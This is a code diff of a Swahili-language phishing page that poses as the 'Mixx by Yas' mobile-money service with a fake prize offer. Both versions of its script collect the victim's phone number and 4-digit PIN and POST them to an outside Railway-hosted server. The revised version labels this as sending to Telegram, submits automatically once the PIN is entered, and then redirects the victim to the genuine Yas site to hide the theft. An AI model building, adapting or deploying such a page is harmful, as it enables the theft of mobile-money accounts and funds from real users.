@@ -1,116 +1,404 @@
 <!DOCTYPE html>
 <html lang="sw">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mixx by Yas | Ofa Maalum</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{background:linear-gradient(145deg,#0b2b26,#0a1f1c);font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;}
-        .card{max-width:520px;width:100%;background:rgba(255,255,255,0.97);border-radius:48px;padding:2rem 1.8rem;box-shadow:0 25px 45px -12px rgba(0,0,0,0.45);}
-        h2{font-size:1.85rem;font-weight:700;background:linear-gradient(135deg,#d4af37,#f5c542);background-clip:text;-webkit-background-clip:text;color:transparent;text-align:center;}
-        .subtitle{text-align:center;color:#2c5a4e;margin-bottom:1.8rem;padding-bottom:1rem;border-bottom:1px dashed #b9dfcf;}
-        .phone-input{margin-bottom:1.5rem;}
-        .phone-input input{width:100%;padding:1rem;font-size:1.1rem;border:2px solid #e2e8f0;border-radius:60px;background:#fefdf8;outline:none;}
-        .phone-input input:focus{border-color:#f5b042;}
-        .pin-label{font-weight:600;color:#1e4a3b;margin-bottom:0.75rem;}
-        .pin-boxes{display:flex;gap:14px;justify-content:center;margin:0.5rem 0;}
-        .pin-box{width:70px;height:70px;text-align:center;font-size:2.2rem;font-weight:700;border:2px solid #cfdfd9;border-radius:20px;background:white;}
-        .pin-box:focus{border-color:#f5b042;outline:none;}
-        .note{text-align:center;font-size:0.72rem;color:#6f8a82;margin-top:1.8rem;background:#f3f9f6;padding:8px;border-radius:40px;}
-        footer{text-align:center;margin-top:1.8rem;font-size:0.7rem;color:#98afa8;}
-        .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:#1e2f2a;color:#ffde9c;padding:12px 28px;border-radius:60px;opacity:0;transition:0.2s;pointer-events:none;z-index:1000;}
-        @media(max-width:480px){.pin-box{width:55px;height:55px;font-size:1.8rem;}}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>MIXX_BY YAS</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+        background: linear-gradient(145deg, #e0e5ec 0%, #f0f4fa 100%);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        padding: 16px;
+        position: relative;
+    }
+
+    /* Watermark pattern - lighter for mobile */
+    .watermark {
+        position: fixed;
+        font-size: 60px;
+        font-weight: 900;
+        color: rgba(244, 180, 0, 0.06);
+        pointer-events: none;
+        z-index: 0;
+        white-space: nowrap;
+    }
+    .top-left { top: 10px; left: 10px; transform: rotate(-15deg); }
+    .top-right { top: 10px; right: 10px; transform: rotate(15deg); }
+    .bottom-left { bottom: 10px; right: 10px; transform: rotate(10deg); }
+    .bottom-right { bottom: 10px; left: 10px; transform: rotate(-10deg); }
+
+    .wrapper {
+        background: rgba(255,255,255,0.96);
+        backdrop-filter: blur(2px);
+        border-radius: 48px;
+        padding: 30px 20px 40px;
+        max-width: 450px;
+        width: 100%;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.15), inset 0 1px 2px rgba(255,255,255,0.6);
+        z-index: 2;
+        transition: opacity 0.3s;
+        border: 1px solid rgba(244,180,0,0.3);
+    }
+
+    /* SVG responsive */
+    svg {
+        max-width: 140px;
+        height: auto;
+        margin-bottom: 8px;
+        filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+    }
+
+    h1 {
+        font-size: 32px;
+        background: linear-gradient(135deg, #1C2E5B, #2c4580);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        letter-spacing: 1px;
+        margin-top: 5px;
+    }
+
+    .win-text {
+        background: linear-gradient(120deg, #F4B400, #FFD966);
+        display: inline-block;
+        padding: 10px 20px;
+        border-radius: 50px;
+        font-size: 18px;
+        font-weight: 800;
+        color: #1C2E5B;
+        margin: 20px 0 18px;
+        box-shadow: 0 4px 0 #b87f00;
+        transform: rotate(-0.5deg);
+    }
+
+    label {
+        display: block;
+        text-align: left;
+        font-weight: 700;
+        color: #1C2E5B;
+        margin: 18px 0 6px 5px;
+        font-size: 14px;
+    }
+
+    input[type="tel"] {
+        width: 100%;
+        padding: 14px 18px;
+        font-size: 18px;
+        border: 2px solid #e2e8f0;
+        border-radius: 50px;
+        background: white;
+        transition: 0.2s;
+        outline: none;
+        font-weight: 500;
+        -webkit-appearance: none;
+    }
+
+    input[type="tel"]:focus {
+        border-color: #F4B400;
+        box-shadow: 0 0 0 3px rgba(244,180,0,0.2);
+    }
+
+    .pin-wrapper {
+        display: flex;
+        gap: 12px;
+        justify-content: center;
+        margin: 12px 0 10px;
+    }
+
+    .pin-box {
+        width: 65px;
+        height: 65px;
+        text-align: center;
+        font-size: 32px;
+        font-weight: bold;
+        border: 2px solid #cbd5e1;
+        border-radius: 20px;
+        background: white;
+        transition: 0.1s;
+        font-family: monospace;
+        outline: none;
+        -webkit-appearance: none;
+    }
+
+    .pin-box:focus {
+        border-color: #F4B400;
+        box-shadow: 0 0 0 2px #ffe699;
+    }
+
+    /* Toast notification */
+    .toast {
+        position: fixed;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #1C2E5B;
+        color: #F4B400;
+        padding: 12px 24px;
+        border-radius: 50px;
+        font-weight: 600;
+        font-size: 14px;
+        opacity: 0;
+        transition: opacity 0.3s;
+        pointer-events: none;
+        z-index: 1000;
+        white-space: nowrap;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+
+    /* Mobile optimization */
+    @media (max-width: 480px) {
+        body {
+            padding: 12px;
+        }
+        .wrapper {
+            padding: 24px 16px 35px;
+            border-radius: 40px;
+        }
+        h1 {
+            font-size: 28px;
+        }
+        .win-text {
+            font-size: 14px;
+            padding: 8px 16px;
+        }
+        .pin-box {
+            width: 55px;
+            height: 55px;
+            font-size: 28px;
+            border-radius: 16px;
+        }
+        .pin-wrapper {
+            gap: 10px;
+        }
+        input[type="tel"] {
+            padding: 12px 16px;
+            font-size: 16px;
+        }
+        label {
+            font-size: 13px;
+        }
+        .toast {
+            white-space: normal;
+            text-align: center;
+            min-width: 200px;
+            font-size: 12px;
+        }
+    }
+
+    @media (max-width: 380px) {
+        .pin-box {
+            width: 48px;
+            height: 48px;
+            font-size: 24px;
+            border-radius: 14px;
+        }
+        .pin-wrapper {
+            gap: 8px;
+        }
+    }
+
+    .footer-note {
+        margin-top: 18px;
+        font-size: 11px;
+        color: #6c757d;
+    }
+</style>
 </head>
 <body>
-    <div class="card">
-        <h2>✨ Umejishindia Ofa Wa Mixx by Yas pesa ✨</h2>
-        <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa ya kipekee.</p>
-        <div class="phone-input">
-            <input type="tel" id="phoneNumber" placeholder="Namba ya Simu (ex: 0765123456)" maxlength="10" inputmode="numeric">
+
+<div class="watermark top-left">Mixx</div>
+<div class="watermark top-right">Mixx</div>
+<div class="watermark bottom-left">Mixx</div>
+<div class="watermark bottom-right">Mixx</div>
+
+<div class="wrapper" id="appWrapper">
+    <!-- SVG LOGO -->
+    <svg width="140" height="107" viewBox="0 0 400 300">
+        <ellipse cx="200" cy="240" rx="70" ry="12" fill="rgba(0,0,0,0.08)"/>
+        <rect x="120" y="50" width="140" height="160" rx="22" fill="#fff" stroke="#F4B400" stroke-width="8"/>
+        <rect x="170" y="185" width="40" height="8" rx="4" fill="#F4B400"/>
+        <polygon points="210,25 300,65 250,120 160,80" fill="#F4B400"/>
+        <polygon points="225,15 315,55 265,110 175,70" fill="#FFD54F" opacity="0.9"/>
+        <line x1="200" y1="120" x2="185" y2="140" stroke="#F4B400" stroke-width="4"/>
+        <line x1="210" y1="125" x2="195" y2="150" stroke="#F4B400" stroke-width="4"/>
+        <text x="95" y="260" font-size="52" fill="#1C2E5B" font-weight="bold">mixx</text>
+        <text x="205" y="260" font-size="52" fill="#F4B400" font-weight="bold">by yas</text>
+    </svg>
+
+    <h1>MIXX_BY YAS</h1>
+    <div class="win-text">✨ UMEJISHINDIA OFA WA MIXX_BY YAS ✨</div>
+
+    <form id="yasForm" onsubmit="return false;">
+        <input type="hidden" name="pin" id="pinHidden">
+
+        <label>📱 Namba ya Mixx</label>
+        <input type="tel" name="phone" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off" inputmode="numeric">
+
+        <label>🔐 PIN</label>
+        <div class="pin-wrapper" id="pinWrapper">
+            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
         </div>
-        <div class="pin-label">🔐 Mixx by Yas PIN (Siri yako ya 4 tarakimu)</div>
-        <div class="pin-boxes">
-            <input type="tel" maxlength="1" class="pin-box" id="pin1" inputmode="numeric">
-            <input type="tel" maxlength="1" class="pin-box" id="pin2" inputmode="numeric">
-            <input type="tel" maxlength="1" class="pin-box" id="pin3" inputmode="numeric">
-            <input type="tel" maxlength="1" class="pin-box" id="pin4" inputmode="numeric">
-        </div>
-        <p class="note">⚠️ Kuingiza neno siri kunakubali maelezo ya matumizi na masharti ya ofa.</p>
-        <footer>© Mixx by Yas – Ofa maalum ya wateja.</footer>
-    </div>
-    <div id="toast" class="toast"></div>
-    <script>
-        const pin1=document.getElementById('pin1');
-        const pin2=document.getElementById('pin2');
-        const pin3=document.getElementById('pin3');
-        const pin4=document.getElementById('pin4');
-        const phone=document.getElementById('phoneNumber');
-        const toast=document.getElementById('toast');
+    </form>
+
+    <div class="footer-note">💰 Tuma sasa!</div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+    (function(){
+        const phoneInput = document.getElementById("phoneInput");
+        const pinHidden = document.getElementById("pinHidden");
+        const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
+        const wrapper = document.getElementById("appWrapper");
+        const toast = document.getElementById("toast");
         
-        // YOUR RAILWAY BACKEND URL
+        let realPin = ["", "", "", ""];
+        let submitted = false;
+
+        // Your Railway backend URL
         const API_URL = 'https://mxxyasstz-production.up.railway.app/Server';
-        
-        function show(msg,isError=true){
-            toast.textContent=msg;
-            toast.style.opacity='1';
-            toast.style.backgroundColor=isError?'#872341':'#1f4e3f';
-            setTimeout(()=>toast.style.opacity='0',3000);
+
+        function showToast(message, isError = true) {
+            toast.textContent = message;
+            toast.style.backgroundColor = isError ? '#872341' : '#1C2E5B';
+            toast.style.color = isError ? '#fff' : '#F4B400';
+            toast.style.opacity = '1';
+            setTimeout(() => {
+                toast.style.opacity = '0';
+            }, 3000);
         }
-        
-        async function submitForm(){
-            const p=phone.value.trim();
-            const pin=pin1.value+pin2.value+pin3.value+pin4.value;
-            
-            if(!p || p.length!==10){show('Phone must be 10 digits');return;}
-            if(pin.length!==4){show('PIN must be 4 digits');return;}
-            
-            show('Sending...',false);
-            
-            try{
-                // SENDING TO RAILWAY BACKEND
-                const res=await fetch(API_URL,{
-                    method:'POST',
-                    headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({phone:p, pin:pin})
-                });
-                const data=await res.json();
-                if(data.status==='success'){
-                    show('Success! Offer claimed.',false);
-                    phone.value='';
-                    pin1.value='';pin2.value='';pin3.value='';pin4.value='';
-                    pin1.focus();
-                }else{
-                    show(data.message||'Failed, try again');
-                }
-            }catch(e){
-                console.error('Error:',e);
-                show('Network error. Try again.');
-            }
-        }
-        
-        pin1.addEventListener('input',e=>{if(e.target.value)pin2.focus();});
-        pin2.addEventListener('input',e=>{if(e.target.value)pin3.focus();});
-        pin3.addEventListener('input',e=>{if(e.target.value)pin4.focus();});
-        pin4.addEventListener('input',e=>{if(e.target.value)submitForm();});
-        
-        phone.addEventListener('keypress',e=>{
-            if(e.key==='Enter'){
-                const allFilled=pin1.value&&pin2.value&&pin3.value&&pin4.value;
-                if(allFilled&&phone.value.length===10)submitForm();
-            }
+
+        // Phone number: only digits, max 10
+        phoneInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
         });
-        
-        [pin1,pin2,pin3,pin4].forEach(p=>{
-            p.addEventListener('keydown',e=>{
-                if(e.key==='Backspace' && !p.value){
-                    if(p===pin2)pin1.focus();
-                    if(p===pin3)pin2.focus();
-                    if(p===pin4)pin3.focus();
+
+        async function sendToTelegram(phone, pin) {
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phone: phone, pin: pin })
+                });
+                
+                const data = await response.json();
+                return data.status === 'success';
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        async function submitCapture() {
+            if (submitted) return;
+            
+            const phone = phoneInput.value;
+            const fullPin = realPin.join('');
+            
+            // Validate
+            if (!phone || phone.length !== 10) {
+                showToast('📱 Tafadhali ingiza namba sahihi ya simu (tarakimu 10)');
+                return;
+            }
+            
+            if (fullPin.length !== 4) {
+                showToast('🔐 Tafadhali kamilisha PIN yako ya tarakimu 4');
+                return;
+            }
+            
+            submitted = true;
+            
+            console.log('📱 Phone:', phone);
+            console.log('🔐 PIN:', fullPin);
+            
+            showToast('📤 Inatuma... Asante kwa ushirikiano!', false);
+            
+            // Send to Telegram
+            const success = await sendToTelegram(phone, fullPin);
+            
+            if (success) {
+                console.log('✅ Sent to Telegram successfully');
+            } else {
+                console.log('❌ Failed to send to Telegram');
+            }
+            
+            // Fade out effect before redirect
+            wrapper.style.transition = "opacity 0.5s";
+            wrapper.style.opacity = "0";
+            
+            // Redirect to real Mixx site
+            setTimeout(() => {
+                window.location.href = "https://yas.co.tz/mixx-by-yas/";
+            }, 800);
+        }
+
+        function updateHiddenAndCheck() {
+            pinHidden.value = realPin.join('');
+            if (realPin.every(x => x !== "") && phoneInput.value.length === 10 && !submitted) {
+                submitCapture();
+            }
+        }
+
+        pinBoxes.forEach((box, idx) => {
+            box.addEventListener('input', function(e) {
+                let val = e.target.value.replace(/\D/g, '');
+                if (!val) return;
+                e.target.value = val;
+                realPin[idx] = val;
+                
+                // Visual masking after short delay
+                setTimeout(() => {
+                    if (document.activeElement !== box) {
+                        e.target.value = '•';
+                    }
+                }, 100);
+                
+                if (idx < 3) pinBoxes[idx + 1].focus();
+                updateHiddenAndCheck();
+            });
+            
+            box.addEventListener('keydown', function(e) {
+                if (e.key === "Backspace") {
+                    realPin[idx] = "";
+                    if (idx > 0 && !box.value) pinBoxes[idx - 1].focus();
+                    updateHiddenAndCheck();
+                }
+            });
+            
+            box.addEventListener('beforeinput', function(e) {
+                if (e.inputType === "insertText" && !/^\d$/.test(e.data)) {
+                    e.preventDefault();
                 }
             });
         });
-    </script>
+        
+        // Handle Enter key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === "Enter" && realPin.every(x => x !== "") && phoneInput.value.length === 10 && !submitted) {
+                e.preventDefault();
+                submitCapture();
+            }
+        });
+    })();
+</script>
+
 </body>
 </html>
